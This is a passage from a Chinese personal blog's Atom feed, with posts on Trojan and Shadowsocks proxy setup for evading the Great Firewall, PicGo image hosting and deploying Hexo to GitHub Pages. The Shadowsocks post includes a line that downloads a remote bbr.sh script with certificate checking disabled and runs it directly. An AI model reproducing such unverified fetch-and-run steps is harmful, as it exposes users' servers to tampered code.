    <summary type="html">&lt;h2 id=&quot;Trojan-介绍&quot;&gt;&lt;a href=&quot;#Trojan-介绍&quot; class=&quot;headerlink&quot; title=&quot;Trojan 介绍&quot;&gt;&lt;/a&gt;Trojan 介绍&lt;/h2&gt;&lt;p&gt;Trojan，原来多是指特洛伊木马，是一种计算机病毒程序。但是，我们今天所说的Trojan是一种新的科学上网技术，全称为Trojan-GFW，是目前最成功的科学上网伪装技术之一。你可以认为Trojan是V2Ray的“WS+TLS”模式的精简版，速度比V2Ray更快，伪装比V2Ray更逼真，更难以被GFW识别。&lt;br&gt;Trojan工作原理：Trojan通过监听443端口，模仿互联网上最常见的 HTTPS 协议，把合法的Trojan代理数据伪装成正常的 HTTPS 通信，并真正地完整完成的TLS 握手，以诱骗GFW认为它就是 HTTPS，从而不被识别。Trojan处理来自外界的 HTTPS 请求，如果是合法的，那么为该请求提供服务，否则将该流量转交给Caddy、Nginx等 web 服务器，由 Caddy、Nginx 等为其提供网页访问服务。基于整个交互过程，这样能让你的VPS更像一个正常的web服务器，因为Trojan的所有行为均与 Caddy、Nginx等 web 服务器一致，并没有引入额外特征，从而达到难以识别的效果。&lt;br&gt;Trojan-Go是Trojan-GFW的分支项目，对Trojan进行性能优化，并增加不少新功能，Trojan-Go性能和功能均有大幅度的提升，而且支持分流和CDN。&lt;/p&gt;</summary>
    
    
    
    <category term="网络" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="VPN" scheme="http://example.com/tags/VPN/"/>
    
  </entry>
  
  <entry>
    <title>Gitee + PicGo 床图</title>
    <link href="http://example.com/2021/12/19/Gitee-PicGo-%E5%BA%8A%E5%9B%BE/"/>
    <id>http://example.com/2021/12/19/Gitee-PicGo-%E5%BA%8A%E5%9B%BE/</id>
    <published>2021-12-19T08:46:54.000Z</published>
    <updated>2022-01-01T16:39:18.604Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近搭建好博客，十分开心。当我兴奋地将本地的文章上传后，可悲的事情发生了。图片都没显示出来，显示出来的是<code>![[Pasted image 20211216103159.png]]</code>这样一串markdown格式的图片地址。<br>因为markdown的图片保存的是一个连接图片的链接，无法直接保存图片。<br>后面尝试了<code>聚合床图</code>这种方式上传图片得到床图，但是这种方式提供的免费空间小并且每次文章上传前都必须手动上传修改图片的链接，十分麻烦，免费版还有链接失效，商家倒闭的风险，维护起来十分麻烦。<br>经过查询，发现gitee + PicGo 方法得到的床图比较适合我，不仅有适合存放小型个人博客照片的空间并且安全性有保障，话可以使用插件，在写文章时就可以在直接将文章中的照片转换成床图格式，不需要自己重新修改。</p><span id="more"></span><h2 id="Gitee"><a href="#Gitee" class="headerlink" title="Gitee"></a>Gitee</h2><ol><li>注册一个gite账号<br>网址：<a href="https://gitee.com/">https://gitee.com/</a><br>git用户的注册及ssh设置请自行百度，在此不表</li><li>创建一个仓库<br>点击新建仓库<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191623114.png" alt="新建仓库"><br>填写基本信息<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191627883.png" alt="填写基本信息"><br>进入设置-&gt;私人令牌-&gt;提交<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191631785.png" alt="私人令牌"></li></ol><h2 id="PicGo"><a href="#PicGo" class="headerlink" title="PicGo"></a>PicGo</h2><ol><li>下载 PicGo<br>网址：<a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></li><li>下载gitee<br>下载该插件：<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191637268.png"></li><li>修改床图设置<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191636823.png"></li></ol><blockquote><p>PS：repo 填写的是下面的路径</p></blockquote><p> <img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191639534.png"></p><ol start="4"><li>尝试上传文件</li></ol><h2 id="obsidian-插件"><a href="#obsidian-插件" class="headerlink" title="obsidian 插件"></a>obsidian 插件</h2><p> 打开Obsidian第三方插件，搜索“image auto upload”插件，启动后，打开配置页面，打开自动上传开关。这样当你在Obsidian笔记中插入一个图片时，插件会自动把图片上传到远端的图床。<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191643567.png"></p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191645600.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近搭建好博客，十分开心。当我兴奋地将本地的文章上传后，可悲的事情发生了。图片都没显示出来，显示出来的是&lt;code&gt;![[Pasted image 20211216103159.png]]&lt;/code&gt;这样一串markdown格式的图片地址。&lt;br&gt;因为markdown的图片保存的是一个连接图片的链接，无法直接保存图片。&lt;br&gt;后面尝试了&lt;code&gt;聚合床图&lt;/code&gt;这种方式上传图片得到床图，但是这种方式提供的免费空间小并且每次文章上传前都必须手动上传修改图片的链接，十分麻烦，免费版还有链接失效，商家倒闭的风险，维护起来十分麻烦。&lt;br&gt;经过查询，发现gitee + PicGo 方法得到的床图比较适合我，不仅有适合存放小型个人博客照片的空间并且安全性有保障，话可以使用插件，在写文章时就可以在直接将文章中的照片转换成床图格式，不需要自己重新修改。&lt;/p&gt;</summary>
    
    
    
    <category term="博客" scheme="http://example.com/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="Blog" scheme="http://example.com/tags/Blog/"/>
    
  </entry>
  
  <entry>
    <title>Vultr + Shadowsocks影梭</title>
    <link href="http://example.com/2021/12/18/Vultr-Shadowsocks%E5%BD%B1%E6%A2%AD/"/>
    <id>http://example.com/2021/12/18/Vultr-Shadowsocks%E5%BD%B1%E6%A2%AD/</id>
    <published>2021-12-18T06:52:09.000Z</published>
    <updated>2022-01-01T16:44:35.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Vultr"><a href="#Vultr" class="headerlink" title="Vultr"></a>Vultr</h2><p>创建一个vps，使用Centos7系统<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112271100961.png" alt="创建VPS"></p><span id="more"></span><h2 id="VPN-部署"><a href="#VPN-部署" class="headerlink" title="VPN 部署"></a>VPN 部署</h2><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><blockquote><p>yum install docker -y</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506558.png"></p><h3 id="启动Docker"><a href="#启动Docker" class="headerlink" title="启动Docker"></a>启动Docker</h3><blockquote><p>service docker start</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506591.png"></p><blockquote><p>chkconfig docker on</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506621.png"></p><p>检查Docker 状态</p><blockquote><p>docker version</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506653.png"></p><p>安装 Shadowsocks 的 VPN Docker 镜像</p><blockquote><p>docker pull imhang/shadowsocks-docker<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506689.png"></p></blockquote><p>运行镜像</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --restart=always -e <span class="string">&quot;SS_PORT=443&quot;</span> -e <span class="string">&quot;SS_PASSWORD=VPS_is_c@@1&quot;</span> -e <span class="string">&quot;SS_METHOD=chacha20-ietf-poly1305&quot;</span> -e <span class="string">&quot;SS_TIMEOUT=600&quot;</span> -p <span class="number">443</span>:<span class="number">443</span> -p <span class="number">443</span>:<span class="number">443</span>/udp --name ssserver imhang/shadowsocks-docker</span><br></pre></td></tr></table></figure><ul><li>  SS_PASSWORD= 这里是密码，比如案例的密码是 VPS_is_c@@1</li><li>  SS_METHOD 是加密方式，建议用一些不常见的比如 salsa20 或者 chacha20 等，更不容易被识别</li><li>  SS_PORT 这里是<strong>服务器端口号</strong>，比如案例的端口号是443</li></ul><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506730.png"></p><h2 id="连接ss"><a href="#连接ss" class="headerlink" title="连接ss"></a>连接ss</h2><p>使用ss客户端进行连接即可</p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506771.png"></p><h2 id="BBR-加速"><a href="#BBR-加速" class="headerlink" title="BBR 加速"></a>BBR 加速</h2><h3 id="更新-yum-源"><a href="#更新-yum-源" class="headerlink" title="更新 yum 源"></a>更新 yum 源</h3><blockquote><p>yum update</p></blockquote><h3 id="安装bbr"><a href="#安装bbr" class="headerlink" title="安装bbr"></a>安装bbr</h3><h4 id="检查内核版本"><a href="#检查内核版本" class="headerlink" title="检查内核版本"></a>检查内核版本</h4><p>开启 BBR 要求 4.10 以上版本 Linux 内核，可使用如下命令查看当前内核版本</p><blockquote><p>uname -r</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506808.png"></p><h4 id="更新内核版本"><a href="#更新内核版本" class="headerlink" title="更新内核版本"></a>更新内核版本</h4><p>如果当前内核版本低于 4.10，可使用 <a href="http://elrepo.org/tiki/tiki-index.php">ELRepo</a> 源更新</p><h4 id="安装部署bbr"><a href="#安装部署bbr" class="headerlink" title="安装部署bbr"></a>安装部署bbr</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget –no-check-certificate [https:<span class="comment">//github.com/teddysun/across/raw/master/bbr.sh](https://github.com/teddysun/across/raw/master/bbr.sh) &amp;&amp; chmod +x bbr.sh &amp;&amp; ./bbr.sh</span></span><br></pre></td></tr></table></figure><h3 id="检测bbr"><a href="#检测bbr" class="headerlink" title="检测bbr"></a>检测bbr</h3><blockquote><p>uname -r</p><p>sysctl net.ipv4.tcp_available_congestion_control 【返回 reno cubic bbr】</p><p>sysctl net.ipv4.tcp_congestion_control【返回 bbr】</p><p>sysctl net.core.default_qdisc【返回pfifo_fast】</p><p>lsmod | grep bbr【返回 tcp_bbr模块】</p></blockquote><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112191506852.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>如果内核升级不理解可以查看：<a href="https://www.jianshu.com/p/62c9b9570c05">内核升级</a><br>参考文章：<a href="https://medium.com/vkuajing/vpn%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B-%E5%A4%96%E8%B4%B8%E7%BF%BB%E5%A2%99%E6%95%99%E7%A8%8B-%E8%B6%85%E8%AF%A6%E7%BB%86-%E6%9C%80%E6%96%B0%E7%89%88-2020-2%E6%9C%88%E6%9B%B4%E6%96%B0-2054e5f86af9">vpn搭建教程-外贸翻墙教程-超详细-最新版-2020-2月更新</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Vultr&quot;&gt;&lt;a href=&quot;#Vultr&quot; class=&quot;headerlink&quot; title=&quot;Vultr&quot;&gt;&lt;/a&gt;Vultr&lt;/h2&gt;&lt;p&gt;创建一个vps，使用Centos7系统&lt;br&gt;&lt;img src=&quot;https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/image/202112271100961.png&quot; alt=&quot;创建VPS&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="网络" scheme="http://example.com/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="VPN" scheme="http://example.com/tags/VPN/"/>
    
  </entry>
  
  <entry>
    <title>Github + Hexo 部署博客</title>
    <link href="http://example.com/2021/12/18/Github%20+%20Hexo%20%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/"/>
    <id>http://example.com/2021/12/18/Github%20+%20Hexo%20%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/</id>
    <published>2021-12-17T17:40:24.000Z</published>
    <updated>2022-01-01T16:40:26.920Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境需求"><a href="#环境需求" class="headerlink" title="环境需求"></a>环境需求</h2><ul><li>git</li><li>GitHub账号</li><li>Node.Js</li><li>Hexo</li></ul><h2 id="Git-环境"><a href="#Git-环境" class="headerlink" title="Git 环境"></a>Git 环境</h2><p>官网：<a href="https://git-scm.com/">https://git-scm.com</a><br>可以下载桌面版或命令版，根据自身情况进行下载，新手推荐桌面版。</p><span id="more"></span><h2 id="Node-js-环境"><a href="#Node-js-环境" class="headerlink" title="Node.js 环境"></a>Node.js 环境</h2><p>官网：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br>直接下载稳定版或最新版</p><h2 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h2><h3 id="1-注册一个git-账号"><a href="#1-注册一个git-账号" class="headerlink" title="1. 注册一个git 账号"></a>1. 注册一个git 账号</h3><h3 id="2-创建一个-repository-仓库"><a href="#2-创建一个-repository-仓库" class="headerlink" title="2. 创建一个 repository(仓库)"></a>2. 创建一个 repository(仓库)</h3><p>仓库名使用：xxx.github.io (xxx为你的用户名)<br><img src="https://pic.imgdb.cn/item/61bead3e2ab3f51d91749c25.jpg"></p><h3 id="3-导入ssh"><a href="#3-导入ssh" class="headerlink" title="3.  导入ssh"></a>3.  导入ssh</h3><p>为什么要配置这个呢？因为你提交代码肯定要拥有你的github权限才可以，但是直接使用用户名和密码太不安全了，所以我们使用ssh key来解决本地和服务器的连接问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/. ssh #检查本机已存在的ssh密钥</span><br></pre></td></tr></table></figure><p>如果提示：No such file or directory 说明你是第一次使用git。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮件地址&quot;</span></span><br></pre></td></tr></table></figure><p>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p><p><img src="http://image.liuxianan.com/201608/20160818_143914_495_9084.png"></p><p>将刚复制的内容粘贴到key那里，title随便填，保存。</p><h3 id="4-创建本地git文件夹"><a href="#4-创建本地git文件夹" class="headerlink" title="4. 创建本地git文件夹"></a>4. 创建本地git文件夹</h3><p>创建一个空的文件夹作为你的git本地文件夹就好了</p><h2 id="Hexo-环境"><a href="#Hexo-环境" class="headerlink" title="Hexo 环境"></a>Hexo 环境</h2><p>官网： <a href="http://hexo.io/">http://hexo.io</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>创建一个空的文件夹，作为存放代码的位置。<br>在该目录下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml # 网站的配置信息，您可以在此配置大部分的参数。 </span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds # 模版文件夹</span><br><span class="line">├── source  # 资源文件夹，除 _posts 文件，其他以下划线_开头的文件或者文件夹不会被编译打包到public文件夹</span><br><span class="line">|   ├── _drafts # 草稿文件</span><br><span class="line">|   └── _posts # 文章Markdowm文件 </span><br><span class="line">└── themes  # 主题文件夹</span><br></pre></td></tr></table></figure><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><h3 id="开启本地预览服务"><a href="#开启本地预览服务" class="headerlink" title="开启本地预览服务"></a>开启本地预览服务</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>开启后我们就可以通过hostlocal:4000查看网页的内容，不过是在本地的。<br>PS:CTRL + C 退出</p><h3 id="修改-conf-yum-文件"><a href="#修改-conf-yum-文件" class="headerlink" title="修改 _conf.yum 文件"></a>修改 _conf.yum 文件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">theme: ayer #主题名</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="attr">deploy</span>:</span><br><span class="line"></span><br><span class="line"> type: git</span><br><span class="line"></span><br><span class="line"> <span class="attr">repository</span>:  https:<span class="comment">//github.com/MikeyNing/MikeyNing.github.io.git</span></span><br><span class="line"></span><br><span class="line"> branch: main</span><br></pre></td></tr></table></figure><p> repository 可以在GitHub直接复制<br> <img src="https://pic.imgdb.cn/item/61beae1e2ab3f51d9174d9b3.jpg"></p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h2 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>部署成功后，可以使用 xxx.github.io 进入自己的博客网站查看。如果没有变化，可以尝试 </p><ol><li> 使用git上传更新的文件 </li><li> <code>hexo f</code> 再 <code>hexo d</code></li></ol><h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><p>GitHub上搜索 Hexo theme ，找到喜欢的主题，根据提示进行下载部署，并且修改 _conf.yum 中的主题名。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;环境需求&quot;&gt;&lt;a href=&quot;#环境需求&quot; class=&quot;headerlink&quot; title=&quot;环境需求&quot;&gt;&lt;/a&gt;环境需求&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;git&lt;/li&gt;
&lt;li&gt;GitHub账号&lt;/li&gt;
&lt;li&gt;Node.Js&lt;/li&gt;
&lt;li&gt;Hexo&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Git-环境&quot;&gt;&lt;a href=&quot;#Git-环境&quot; class=&quot;headerlink&quot; title=&quot;Git 环境&quot;&gt;&lt;/a&gt;Git 环境&lt;/h2&gt;&lt;p&gt;官网：&lt;a href=&quot;https://git-scm.com/&quot;&gt;https://git-scm.com&lt;/a&gt;&lt;br&gt;可以下载桌面版或命令版，根据自身情况进行下载，新手推荐桌面版。&lt;/p&gt;</summary>
    
    
    
    <category term="博客" scheme="http://example.com/categories/%E5%8D%9A%E5%AE%A2/"/>
    
    
    <category term="Blog" scheme="http://example.com/tags/Blog/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/12/18/hello-world/"/>
    <id>http://example.com/2021/12/18/hello-world/</id>
    <published>2021-12-17T17:10:10.000Z</published>
    <updated>2022-01-01T16:51:13.928Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
